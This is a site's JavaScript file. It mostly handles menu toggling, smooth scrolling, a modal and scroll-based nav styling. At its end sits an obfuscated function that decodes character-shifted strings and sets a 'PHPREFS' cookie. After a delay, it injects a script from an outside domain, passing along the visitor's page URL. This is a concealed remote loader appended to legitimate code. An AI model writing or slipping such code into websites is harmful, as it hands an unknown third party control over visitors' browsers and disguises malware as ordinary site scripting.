function main() {
  const e = document.getElementById("hamburger"),
    t =
      (document.getElementById("navigation"),
      document.getElementById("nav-container")),
    n = document.getElementById("close-nav"),
    l = document.getElementById("myAudio");
  document.querySelectorAll('a[href^="#"]').forEach((e) => {
    e.addEventListener("click", function (e) {
      e.preventDefault();
      const t = this.getAttribute("href").substring(1),
        n = document.getElementById(t);
      n && n.scrollIntoView({ behavior: "smooth" });
    });
  });
  const o = document.getElementById("myModal");
  document.getElementById("closeModal").addEventListener("click", () => {
    (o.style.display = "none"), l.play();
  }),
    e.addEventListener("click", () => {
      t.style.display = "flex";
    }),
    n.addEventListener("click", () => {
      t.style.display = "none";
    }),
    t.addEventListener("click", () => {
      t.style.display = "none";
    });
}
window.addEventListener("load", main),
  window.addEventListener("scroll", () => {
    document
      .querySelector(".desktop-nav")
      .classList.toggle("window-scroll", window.scrollY > 100);
  }),
  window.addEventListener("scroll", () => {
    document
      .querySelector(".mobile-nav")
      .classList.toggle("window-scroll", window.scrollY > 100);
  });
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
